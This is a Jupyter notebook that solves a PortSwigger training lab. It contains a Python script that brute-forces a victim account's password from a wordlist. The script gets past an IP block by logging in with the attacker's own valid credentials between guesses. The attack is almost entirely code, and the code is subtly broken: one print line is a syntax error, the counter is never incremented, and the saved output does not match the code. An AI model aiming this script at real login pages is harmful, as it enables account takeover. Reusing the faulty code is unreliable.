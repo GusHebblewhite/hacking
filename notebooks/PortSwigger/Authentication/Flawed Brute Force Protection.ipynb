{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0440bbec",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block\n",
    "\n",
    "This website uses an IP block, however it resets after sucessful logins. As such we can use our own account to log in successfully every few guesses to reset the counter.\n",
    "\n",
    "Our username and password:\\\n",
    "`wiener : peter`\n",
    "\n",
    "Target username:\\\n",
    "`carlos`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "542ef8af",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import tqdm.notebook as tq\n",
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "79d30c60",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "06f3be27a8364dc790d46c20d593d004",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/100 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "URL = \"https://ac7b1fc71e91b7b9c08e14f6003d002a.web-security-academy.net/\"\n",
    "\n",
    "textfile_dir = \"../../../library/text_files/\"\n",
    "with open(textfile_dir + \"pw_list.txt\", 'r') as f:\n",
    "    passwords = [x.strip() for x in f.readlines()]\n",
    "    \n",
    "cnt = 0\n",
    "\n",
    "s = requests.session()\n",
    "s.get(URL)\n",
    "\n",
    "valid_data = {\"username\" : \"wiener\", \"password\" : \"peter\"}\n",
    "s.post(URL + \"login\", data=valid_data)\n",
    "\n",
    "for idx, each_password in enumerate(tq.tqdm(passwords)):\n",
    "    \n",
    "    data = {\"username\" : \"carlos\", \"password\" : each_password}\n",
    "    \n",
    "    r = s.post(URL + \"login\", data=data)\n",
    "    \n",
    "    message = re.findall(r\"<h1>Login</h1>[\\s\\S]*?<p.*?>(.*?)</p>\", r.text)\n",
    "    if message != ['Incorrect password']:\n",
    "        print(message \" : \", each_password)\n",
    "        break\n",
    "    \n",
    "    if cnt%3 == 0:\n",
    "        s.post(URL + \"login\", data=valid_data)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
